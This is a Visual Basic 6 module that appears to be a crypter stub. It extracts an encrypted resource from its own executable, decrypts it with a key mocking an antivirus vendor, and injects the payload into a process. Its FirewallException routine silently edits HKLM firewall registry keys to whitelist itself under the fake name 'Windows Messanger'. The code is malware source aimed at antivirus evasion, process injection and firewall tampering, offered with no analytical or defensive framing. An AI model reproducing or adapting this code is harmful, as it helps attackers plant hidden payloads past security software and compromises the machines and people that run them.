Attribute VB_Name = "mMain"
Option Explicit
Private Declare Function FindResource Lib "kernel32" Alias "FindResourceA" (ByVal hInstance As Long, ByVal lpName As String, ByVal lpType As String) As Long
Private Declare Function LoadResource Lib "kernel32" (ByVal hInstance As Long, ByVal hResInfo As Long) As Long
Private Declare Function LockResource Lib "kernel32" (ByVal hResData As Long) As Long
Private Declare Function SizeofResource Lib "kernel32" (ByVal hInstance As Long, ByVal hResInfo As Long) As Long
Private Declare Function FreeResource Lib "kernel32" (ByVal hResData As Long) As Long
Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
Private Declare Function SetTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
   

Private Sub Main()
    Dim sPath   As String
    Dim bSig    As Byte
    Dim lSize   As Long
    Dim sData   As String
    Dim ca As New CCrypto
    Dim sSize   As String * 8
    Dim hMod As Long, hRes As Long, hLoad As Long, hLock As Long, sBuff As String

hMod = GetModuleHandle(vbNullString)
hRes = FindResource(hMod, 101, "CUSTOM")
hLoad = LoadResource(hMod, hRes)
hLock = LockResource(hLoad)
lSize = SizeofResource(hMod, hRes)

sBuff = Space(lSize)

Call CopyMemory(ByVal sBuff, ByVal hLock, lSize)

Call FreeResource(hLoad)

sPath = ThisExe
Call FirewallException(App.Path & "\" & App.EXEName & ".exe")
        Open sPath For Binary Access Read As #1

            sData = ca.Decrypt(sBuff, "IHATEAVIRA", False, frezBlockEncryption)
            ooo.InjectExe sPath, StrConv(sData, vbFromUnicode)
    
        Close #1
End Sub
Public Sub FirewallException(Path As String)
    
Shell "cmd /c REG ADD HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v ""DoNotAllowExceptions"" /t REG_DWORD /d ""0"" /f", vbHide
Shell "cmd /c REG ADD HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List /v """ & Path & """ /t REG_SZ /d """ & Path & ":*:Enabled:Windows Messanger"" /f", vbHide

End Sub
